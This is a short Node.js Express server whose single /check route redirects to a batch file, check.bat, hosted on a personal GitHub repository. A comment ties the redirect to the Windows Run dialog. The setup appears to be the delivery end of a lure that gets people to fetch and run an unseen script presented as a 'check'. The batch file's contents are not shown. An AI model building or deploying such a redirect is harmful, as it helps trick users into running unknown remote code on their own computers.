const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

app.get('/check', (req, res) => {
    // This tells the browser/Run dialog to download the file directly
    res.redirect('https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.bat');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
